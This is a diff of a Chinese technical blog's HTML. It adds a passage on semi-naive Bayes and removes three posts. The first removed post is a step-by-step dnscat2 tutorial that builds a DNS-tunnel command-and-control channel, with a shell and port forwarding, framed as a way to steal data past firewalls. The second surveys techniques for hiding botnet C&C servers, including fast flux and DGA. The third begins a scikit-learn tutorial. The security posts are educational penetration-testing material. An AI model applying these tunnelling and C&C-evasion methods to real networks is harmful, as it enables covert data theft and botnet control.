+<p>半朴素贝叶斯分类器的基本思想是适当考虑一部分属性间的相互依赖信息，从而既不需要进行完全的联合概率计算，又能保证不会忽略掉比较强的属性依赖关系。</p>
+<p>其中最常用的策略是“独依赖统计（One Dependent Estimator）”，这种方法是假设每个属性在类别之外最多只依赖一个其他属性，这个属性被称为他的父属性。而如何确定这个父属性，现在有SPODE(Super Parent ODE)，TAN(Tree Augmented naive Bayes)，AODE(Averaged One-Dependent Estimator)等方法。</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/24/使用qshell批量下载七牛云文件/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1349,1128 +2466,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/08/07/利用DNS-Tunnel传输数据/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="麻薯">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Leticia's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2018/08/07/利用DNS-Tunnel传输数据/" itemprop="url">
-                  利用DNS Tunnel传输数据
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-08-07T10:37:51+08:00">
-                2018-08-07
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
-                    <span itemprop="name">渗透测试</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2018/08/07/利用DNS-Tunnel传输数据/" class="leancloud_visitors" data-flag-title="利用DNS Tunnel传输数据">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>当一些服务器被黑客非法入侵之后，黑客都是以从入侵中获益作为目标，而最大的获益方式就是偷取高价值的数据，所以大部分公司也会为了高价值的数据保护设下层层防火墙以及加密，让核心资产偷不走、解不开、用不了。</p>
-<p>其中“偷不走”这步，一般都是对出站的流量做很严格的限制，并且加上很多的报警规则，这样即使入侵进去，也很难建立一个通道将核心资产偷走。</p>
-<p>但是防御这件事情，不能因噎废食，服务器不能因为有潜在的风险就把所有的通道都限制掉，就比如服务器需要允许至少对一个服务器的DNS请求，在这个前提下，就有大牛想出通过DNS Tunnel外发数据，避过防火墙来外发数据。</p>
-<h2 id="0x01-DNS"><a href="#0x01-DNS" class="headerlink" title="0x01 DNS"></a>0x01 DNS</h2><p>DNS（Domain Name System，域名系统），万维网上作为域名和IP地址相互映射的一个分布式数据库，能够使用户更方便的访问互联网，而不用去记住能够被机器直接读取的IP数串。通过域名，最终得到该域名对应的IP地址的过程叫做域名解析（或主机名解析）。DNS协议运行在UDP协议之上，使用端口号53。</p>
-<h2 id="0x02-DNS-Tunnel"><a href="#0x02-DNS-Tunnel" class="headerlink" title="0x02 DNS Tunnel"></a>0x02 DNS Tunnel</h2><p>DNS Tunnel，是隐蔽信道的一种，通过将其他协议封装在DNS协议中传输建立通信。</p>
-<p>DNS Tunnel可以分为直连和中继两种。</p>
-<p>直连也就是用目标服务器直接和指定的目标DNS Server(Authoritative NS Server)连接，通过将数据编码封装在DNS协议中进行通信，这种方式速度快，但是隐蔽性比较弱，很容易被探测到，另外限制比较高，很多场景不允许自己指定DNS Server。</p>
-<p>中继是通过DNS迭代查询而实现的中继隧道，则更为隐秘，但同时因为数据包到达目标DNS Server前需要经过多个节点，所以速度上较直连慢很多。</p>
-<p>中继过程中的一个关键点是对DNS缓存机制的规避，因为如果需要解析的域名在Local DNS Server中已经有缓存时，Local DNS Server就不会转发数据包。所以在我们构造的请求中，每次查询的域名都是不一样的或者是已经是过期的。</p>
-<p>对DNS载荷的编码是DNS Tunnel的另一个核心技术。从高层来看，载荷只是客户端和服务器通信的正常流量。例如客户端发送一个A记录请求给服务器，查询的主机名为 2roAUwBaCGRuc3R1bm5lbGluZwo.test.domain.com,其中2roAUwBaCGRuc3R1bm5lbGluZwo则是客户端传递给服务器的信息，这串字符解码后的信息便是dns tunnel。</p>
-<p>大多数场景下，内网的Client位于防火墙后，Server不可能发起连接。所以Client会定时向Server发送请求，保证二者之间的通信状态。</p>
-<h2 id="0x03-使用dnscat2工具实现"><a href="#0x03-使用dnscat2工具实现" class="headerlink" title="0x03 使用dnscat2工具实现"></a>0x03 使用dnscat2工具实现</h2><p>Dnscat2的定位是一个封装在DNS协议中加密的命令与控制(C&amp;C)信道。它同样是C/S架构，Client由c编写，server由ruby编写。Client位于感染主机，而Server位于权威域名服务器上，如果没有权威域名服务器，则可以采用直连模式。</p>
-<p>为了直接达到能拿出来用的效果，我就使用实际场景搭建了，应用于实际场景我们需要一台公网服务器、一个域名、还有dnscat2程序。</p>
-<p>公网服务器作为server端，我建议使用ubuntu或者高版本centos（低版本的centos会出现一些小问题，如果比较熟悉ruby和gem挺容易解决的，我这里使用ubuntu演示，没有太多经验的可以跟着我使用ubuntu来现尝试一下）</p>
-<p>server使用如下代码安装需要的环境，然后使用git下载dnscat2进行安装：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">apt-get install ruby ruby-dev git make g++ rubygems</span><br><span class="line">gem update --system</span><br><span class="line">gem install bundler</span><br><span class="line">git clone https://github.com/iagox86/dnscat2.git</span><br><span class="line">cd dnscat2/server</span><br><span class="line">bundle install</span><br></pre></td></tr></table></figure></p>
-<p>出现几行绿色字体如下所示就代表安装完成了：</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/dns_tunnel/dns01.png?raw=true" alt=""></p>
-<p>然后我们需要在域名解析服务器上这样伪造，设置一个NS记录指向自己的子域名，再设置一个A记录指向自己部署server端的服务器地址。如下图的设置，打码部分是服务器ip地址。</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/dns_tunnel/dns02.png?raw=true" alt=""></p>
-<p>client如果是linux，就使用git下载dnscat2源码，然后编译dnscat2/client文件夹中的c文件</p>
-<p>linux-client端部署代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/iagox86/dnscat2.git</span><br><span class="line">cd dnscat2/client/</span><br><span class="line">make</span><br></pre></td></tr></table></figure></p>
-<p>client如果是windows，就直接在这个网址（<a href="https://downloads.skullsecurity.org/dnscat2/" target="_blank" rel="noopener">https://downloads.skullsecurity.org/dnscat2/</a> ）下载win32.zip的dnascat2后解压就可以了</p>
-<p>至此，环境都部署完毕，就可以开始连接隧道了。我测试时使用ubuntu系统的公网服务器做server，用本机的kali做client。</p>
-<p>我们首先在server端开启隧道：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby ./dnscat2.rb dns.uuzdaisuki.com --no-cache</span><br></pre></td></tr></table></figure></p>
-<p>将这个域名改成自己刚刚设置的ns记录的子域名，–no-cache代表不进行缓存</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/dns_tunnel/dns03.png?raw=true" alt=""></p>
-<p>然后将上面产生的这串secret复制下来，要在client中使用。</p>
-<p>client中运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./dnscat --dns domain=dns.uuzdaisuki.com --secret=xxxxxxxxxxxxxxxxxxxxx</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/dns_tunnel/dns04.png?raw=true" alt=""></p>
-<p>domain参数是我们ns记录的子域名，secret参数是刚才server中生成的密文，我们传输信息的安全程度就取决于它。windows中参数使用略有不同，自己查看help文件即可。</p>
-<p>client运行得到上面结果之后，server中也会出现一个new window create，后面是它的sessionID，我们现在就可以在server中通过这个session连接控制client了</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/dns_tunnel/dns05.png?raw=true" alt=""></p>
-<p>使用如下代码可以进去这个session<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session -i 1</span><br></pre></td></tr></table></figure></p>
-<p>然后使用help可以查看可以使用的命令：</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/dns_tunnel/dns06.png?raw=true" alt=""></p>
-<p>比如我们要使用一个shell控制，可以输入shell获取一个新的window，sessionID为2，然后再session -i 2切入。</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/dns_tunnel/dns07.png?raw=true" alt=""></p>
-<p>之后就可以使用命令交互：</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/dns_tunnel/dns08.png?raw=true" alt=""></p>
-<p>此时我们也可以通过dns隧道来访问目标系统可以访问的网络，类似于ssl，在dnscat2中用listen命令实现：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">listen [lhost:]lport rhost:rport</span><br></pre></td></tr></table></figure></p>
-<p>比如我们要通过对方网络访问百度，那就是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">listen 1234 www.baidu.com:80</span><br></pre></td></tr></table></figure></p>
-<p>访问localhost:1234就可以通过对方网络访问百度了，不过这个功能一般是用来访问内网才可以访问的网站，探测对方内网之后将baidu替换成对方内网的站就可以了。</p>
-<p>我们dns tunnel建立好之后，主要是为了绕过防火墙偷数据，使用help学习其他功能传输即可。</p>
-<h3 id="抓包观察"><a href="#抓包观察" class="headerlink" title="抓包观察"></a>抓包观察</h3><p><img src="https://github.com/echohun/blog_image/blob/master/dns_tunnel/dns09.png?raw=true" alt=""></p>
-<p>在客户端中抓包可以看到，有很多DNS的TXT、CNAME、MX的查询方法，这是因为Dnscat2 利用的DNS请求类型默认是TXT,CNAME,MX随机混合使用，不过我们可以在运行时通过参数自定义来更改请求方式。</p>
-<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>用于dns tunnel的工具除了dnscat2(灵活)，还有dns2tcp(Kali直接集成了这个工具)、iodine(速度快)等，各有特点，我们可以根据实际情况来选取。</p>
-<p>还有要注意的一点是使用了dns tunnel只是绕过了一些传统防火墙，如果对方的防御系统具备一些基于机器学习或深度学习的检测策略，或者对方的安全人员比较熟悉这种偷数据的方式，还是会被发现的。</p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/08/03/C-C控制服务思路浅析/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="麻薯">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Leticia's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2018/08/03/C-C控制服务思路浅析/" itemprop="url">
-                  C&C控制服务思路浅析
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-08-03T10:48:49+08:00">
-                2018-08-03
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
-                    <span itemprop="name">渗透测试</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2018/08/03/C-C控制服务思路浅析/" class="leancloud_visitors" data-flag-title="C&C控制服务思路浅析">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在前面的博客中写过一次用python实现的后门 <a href="http://next.uuzdaisuki.com/2018/06/17/%E5%9F%BA%E4%BA%8Epython%E7%9A%84%E7%9B%B4%E8%BF%9Eshell%E5%92%8C%E5%8F%8D%E5%B0%84shell/" target="_blank" rel="noopener">http://next.uuzdaisuki.com/2018/06/17/%E5%9F%BA%E4%BA%8Epython%E7%9A%84%E7%9B%B4%E8%BF%9Eshell%E5%92%8C%E5%8F%8D%E5%B0%84shell/</a> 里面的代码用最简单的例子来实现了远程控制。</p>
-<p>但是当我们想要构建大规模僵尸网络的时候，就会发现这类简单的后门很不方便，我们不可能有时间一个一个手动的进行控制。而且大部分的肉鸡ip都是一直在变动而且无法直接访问的，所以远控中基本都使用反弹式通信，反弹式通信需要肉鸡每隔一段时间对我们的控制机发送心跳包，但是我们自己的电脑，ip很多情况也都是一直在变动的，我们很难保证自己拥有一个不变的公网ip。为了避免这些问题，我们就需要一台能够集中统一控制僵尸网络的主机，也就是C&amp;C服务器。</p>
-<ul>
-<li>C&amp;C服务器：command and control server(命令与控制服务器)。一般是指挥控制僵尸网络的主控服务器，用来和每个肉鸡进行通信并指挥它们的攻击行为。</li>
-</ul>
-<p>当然我这篇并不打算写一个简单的主控脚本和远控脚本，然后把它部署到公网服务器中，毕竟这些步骤只需要稍微改一下最开始那个链接里面脚本的代码就可以了。这篇我想要对通过各种方法部署和隐藏C&amp;C服务器的方法做一个总结。</p>
-<h2 id="0x01-通过IP地址访问C-amp-C服务器"><a href="#0x01-通过IP地址访问C-amp-C服务器" class="headerlink" title="0x01 通过IP地址访问C&amp;C服务器"></a>0x01 通过IP地址访问C&amp;C服务器</h2><p>最简单的方法就是租用一台云服务器，将服务器ip直接写远控脚本中反弹的ip中，然后所有肉鸡都会每隔一段时间与这个ip进行一次通信，我们也就可以在服务器上用脚本控制僵尸网络发动攻击。</p>
-<p>但是由于ip地址是直接写死在远控脚本或远控程序中的，如果对方捕获了远控脚本或者远控程序，进行简单的二进制逆向扫描就可以得到我们服务器ip地址，并且对方机器经常访问同一个ip也会增加被发现的几率。一旦被发现，对方直接将ip加入黑名单，并且将ip提交给我们购买云服务器的提供商，服务器被封禁就会使远控全部失效。</p>
-<p>优点：简单易实现、耗费小(仅服务器开销)。</p>
-<p>缺点：极易被发现、很容易大规模失效。</p>
-<h2 id="0x02-通过域名访问C-amp-C服务器"><a href="#0x02-通过域名访问C-amp-C服务器" class="headerlink" title="0x02 通过域名访问C&amp;C服务器"></a>0x02 通过域名访问C&amp;C服务器</h2><p>通过域名再指向服务器比起直接指向服务器只是将反弹ip改为反弹的域名。如果注册一些较正常的域名并且做一个伪装的主页，被发现的几率就会降低，而且直接二进制扫描不会被发现。但是逆向程序或着搭建蜜罐进行动态测试，很容易就能追踪到这些域名，将域名丢给运营商的黑名单就会造成大规模的远控失效。</p>
-<p>不过比起仅通过ip地址访问这种方式要多花去安全人员的一点时间，如果在这个时间内达成目的，也算是成功了。</p>
-<p>优点：简单易实现、耗费小(服务器和域名开销)。</p>
-<p>缺点：易被发现、很容易大规模失效。</p>
-<h2 id="0x03-Fast-flux"><a href="#0x03-Fast-flux" class="headerlink" title="0x03 Fast flux"></a>0x03 Fast flux</h2><p>如果一个域名很容易被蜜罐捕获的话，我们可以将几十个域名分散的写在代码中，这些域名都指向同一台服务器的ip地址，程序会对域名轮换访问，然后提供一个较短的ttl使域名对ip的解析记录也会不断的更换。</p>
-<p>这样被捕获某一部分域名添加黑名单并没有办法阻止恶意软件。而且因为ip解析记录一直变更也无法直接举报服务器，所以需要安全人员很高的逆向能力将恶意域名全部找出来。</p>
-<p>不过这个方式有两个缺陷，一个是将捕获的一部分恶意域名的ip解析历史记录进行统计、数据分析，也会很快找到服务器的ip地址。另一个缺陷是域名记录的TTL相比正常的过短，容易被抓住特征。</p>
-<p>优点：被发现后较难快速处理、被屏蔽一部分域名不会造成僵尸网络失效。</p>
-<p>缺点：实现需要足够的代码混淆和隐藏能力、耗费较大(多个域名的开销)、一旦服务器ip被发现仍然会大规模失效。</p>
-<h2 id="0x04-Double-flux、Triple-flux"><a href="#0x04-Double-flux、Triple-flux" class="headerlink" title="0x04 Double flux、Triple flux"></a>0x04 Double flux、Triple flux</h2><p>既然Fast flux容易被捕获一部分恶意域名进行数据分析而发现ip，那域名能增加ip也能增加，Double flux就是在一般的fast flux过程中除了轮换域名，也让ip可以轮换，如果我们有M个域名和N个ip这样就产生了M*N组的C&amp;C通道，还有更多的干扰项。</p>
-<p>Triple flux在Double flux的基础上，增加一层Name Server通过CNAME方式解析，这样域名有可能指向ip也有可能指向别的域名，然后再指向ip，这些Name Server也会定期轮换，就增加了更多C&amp;C通道和干扰项。</p>
-<p>这两种方法都增加了安全人员分析的难度，而且不会因为个别的服务器或域名被封禁导致僵尸网络失效，但是仍然存在着和普通Fast flux一样的问题，那就是因为域名到ip的解析一直轮换导致TTL需要设置很短，很容易被抓取特征而捕获。</p>
-<p>优点：被发现后较难快速处理、被屏蔽一部分域名、封禁一部分ip都不会造成僵尸网络失效。</p>
-<p>缺点：实现需要足够的代码混淆和隐藏能力、耗费很大(多个域名和多个服务器的开销)。</p>
-<h2 id="0x05-使用论坛等作为C-amp-C服务器"><a href="#0x05-使用论坛等作为C-amp-C服务器" class="headerlink" title="0x05 使用论坛等作为C&amp;C服务器"></a>0x05 使用论坛等作为C&amp;C服务器</h2><p>自己架设服务器很容易被封禁，然后丢失僵尸网络的控制权，有的攻击者想到一个绝佳的办法：通过在一些论坛的冷门区域发一些C&amp;C控制指令，然后让恶意软件通过爬虫在访问这些论坛的时候获取指令，最开始主要是在twitter上进行C&amp;C控制，这种情况一开始很让安全人员头疼，因为访问这些论坛的请求本就和正常数据包差不多很难被发现，而且就算发现了，总不能把twitter的域名或者服务器添加很名单吧，这会影响网络的正常使用。后来发现了这种情况可以进行举报，从而封禁对应的账号。</p>
-<p>优点：耗费低、不是特别容易被发现。</p>
-<p>缺点：被发现后会被直接封禁账号损失僵尸网络。</p>
-<h2 id="0x06-使用随机域名生成算法"><a href="#0x06-使用随机域名生成算法" class="headerlink" title="0x06 使用随机域名生成算法"></a>0x06 使用随机域名生成算法</h2><p>比起注册一堆域名耗费巨大，更好的办法是使用DGA(Domain Generation Algorithm)算法，这种C&amp;C控制方法的思路就是控制一个确定的随机域名生成算法，用约定好的随机数种子生成大量的随机域名（如当天日期时间），恶意软件对这些域名全部进行访问，我们只需要按照规律注册其中个别有可能的域名就可以进行控制。</p>
-<p>这个方法的重点在于没有任何确定的域名写入到恶意软件里，即使逆向也找不到真正的域名，而且逆向出这个随机算法的难度非常大。并且生成的随机域名数量十分巨大对方无法得知究竟我们注册了哪个域名。由于随机算法(提前设定好)和随机种子(可以根据时间等生成)都是我们不需要通信就可以得知的信息，我们任何时候都可以知道该注册那种类型的域名可以进行控制。</p>
-<p>除非源码泄露，安全人员要逆向出DGA算法是非常困难的，也很难用黑名单的方式屏蔽掉所有的域名。目前应对这种C&amp;C的方法一般是利用机器学习算法去判定域名的随机性，然后筛选出有可能是恶意域名的域名进行分析找出ip，或者利用机器学习算法智能的屏蔽对这些域名的访问。</p>
-<p>天下没有免费的午餐，这种方式比起前面的方法也有一个缺陷，产生的随机域名过多且访问频率有限的时候，想通过C&amp;C服务器进行控制就需要等待较长的时间，所以在攻击时灵活度不足。强行减少等待的时间就得增加访问频率，就会增加被发现的概率。</p>
-<p>优点：非常难被封禁、很难通过逆向的方式解决掉恶意域名、耗费低(只需一台服务器和几个域名)。</p>
-<p>缺点：控制延迟很高、灵活度不足。</p>
-<h2 id="0x07-使用变形DGA算法"><a href="#0x07-使用变形DGA算法" class="headerlink" title="0x07 使用变形DGA算法"></a>0x07 使用变形DGA算法</h2><p>这个方法是为了对抗检测域名随机性的机器学习算法而产生的，大体步骤和上面相似，不同处是比起使用域名随机算法，添加一些英文单词作为字典构成域名，就比较接近正常的网页，不会被普通的机器学习算法检测出来。</p>
-<p>还是那句话，天下没有免费的午餐，添加字典减少了随机性，必然会缩小产生域名的数量，很快就会用完所有的域名。</p>
-<p>优点：非常难被封禁、很难通过逆向的方式解决掉恶意域名、耗费低(只需一台服务器和几个域名)。</p>
-<p>缺点：控制延迟很高、灵活度不足。</p>
-<h2 id="0x08-总结"><a href="#0x08-总结" class="headerlink" title="0x08 总结"></a>0x08 总结</h2><p>C&amp;C的设计与防御是目前攻防中很重要的一部分，围绕着C&amp;C，双方在攻防博弈中各显神通，完美的结合了机器学习、数据科学等知识，是非常有学习和研究价值的。</p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/08/01/python-scikit-learn学习-2/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="麻薯">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Leticia's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2018/08/01/python-scikit-learn学习-2/" itemprop="url">
-                  python-scikit learn学习(2)
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-08-01T17:06:38+08:00">
-                2018-08-01
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/机器学习/" itemprop="url" rel="index">
-                    <span itemprop="name">机器学习</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2018/08/01/python-scikit-learn学习-2/" class="leancloud_visitors" data-flag-title="python-scikit learn学习(2)">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="0x00-scikit-learn"><a href="#0x00-scikit-learn" class="headerlink" title="0x00 scikit-learn"></a>0x00 scikit-learn</h2><p>Scikit-learn（以前称为scikits.learn）是一个用于Python编程语言的免费开源机器学习库。它广泛地支持各种分类、聚类以及回归分析方法比如支持向量机、随机森林、DBSCAN等等，由于其强大的功能、优异的拓展性以及易用性，目前受到了很多数据科学从业者的欢迎，也是业界相当著名的一个开源项目之一。</p>
-<h2 id="0x01-模型属性与功能"><a href="#0x01-模型属性与功能" class="headerlink" title="0x01 模型属性与功能"></a>0x01 模型属性与功能</h2><p>sklearn库中所有机器学习的模型对象中都有一些属性与功能，假设模型对象名为mod，那么就可以这样表示mod模型的一些属性与功能：</p>
-<ul>
-<li>mod.coef_  x前的系数</li>
-<li>mod.intercept_  截距</li>
-<li>mod.predict() 预测</li>
-<li>mod.get_params() 定义的参数</li>
-<li>mod.score(data_x,data_y) 用data_x做预测，用data_y做比较给模型打分</li>
-</ul>
-<p>我们以上一篇中的线性回归模型为例查看一下这些属性：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from sklearn import datasets</span><br><span class="line">from sklearn.linear_model import LinearRegression</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">example_x,example_y = datasets.make_regression(n_samples=100,n_features=2,n_targets=1,noise=3)</span><br><span class="line"></span><br><span class="line">lr = LinearRegression()</span><br><span class="line">lr.fit(example_x,example_y)</span><br><span class="line"></span><br><span class="line">print(lr.coef_)</span><br><span class="line">print(lr.intercept_)</span><br><span class="line">print(lr.predict(example_x[:5,:]))</span><br><span class="line">print(lr.get_params())</span><br><span class="line">print(lr.score(example_x,example_y))</span><br></pre></td></tr></table></figure>
-<p><img src="https://github.com/echohun/blog_image/blob/master/python_sklearn/sklearn07.png?raw=true" alt=""></p>
-<p>可以从输出中看到：</p>
-<ul>
-<li>lr.coef_输出一个list代表每一种特征前的系数</li>
-<li>lr.intercept_输出截距</li>
-<li>lr.predict()方法可以输入样本进行预测</li>
-<li>lr.get_params()方法可以输出模型的配置信息</li>
-<li>lr.score()方法通过对比预测的数据和原始标签对模型打分</li>
-</ul>
-<h2 id="0x02-标准化"><a href="#0x02-标准化" class="headerlink" title="0x02 标准化"></a>0x02 标准化</h2><p>在训练模型时，某些特征可能会在不同的样本中相差特别大，有一些异常大或者异常小的数据会对模型训练结果造成较大误差，并且数据分布很分散也会影响训练结果，所以一般在训练之前，我们都会对特征数值进行标准化。</p>
-<p>基本的标准化流程是去除每个特征的平均值来转换数据使其居中，然后通过将非常数特征除以它们的标准差来对其进行缩放。</p>
-<p>在scikit-learn库中，有用于预处理数据的模块sklearn.preprocessing，其中scale方法可以快速简便的实现上述标准化操作。用一段代码来尝试一下：</p>
